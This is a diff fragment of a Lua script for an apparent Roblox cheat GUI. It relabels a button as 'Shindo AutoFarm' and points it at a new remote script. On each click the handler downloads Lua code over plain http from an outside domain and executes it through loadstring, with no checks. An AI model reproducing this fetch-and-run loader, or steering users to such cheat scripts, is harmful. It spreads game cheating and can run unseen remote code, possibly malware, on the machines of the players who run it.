@@ -109,11 +109,11 @@ Script5_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Script5_2.Position = UDim2.new(0.6525051, 0, 0.769040406, 0)
 Script5_2.Size = UDim2.new(0, 91, 0, 31)
 Script5_2.Font = Enum.Font.SourceSans
-Script5_2.Text = "Brook ADMIN"
+Script5_2.Text = "Shindo AutoFarm"
 Script5_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 Script5_2.TextSize = 14.000
 Script5_2.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/4c91fe5116b77fa4cc1c91f2e92fc871/raw/74e7a0b80134a8686f4fbd6e0ade5f0d16e20d28/ccccccgqwreqw", true))()
+	loadstring(game:HttpGet("http://killingman107.com/Assasine03/SL2AF.lua", true))()
 end)
 
 Script1.Name = "Script1"
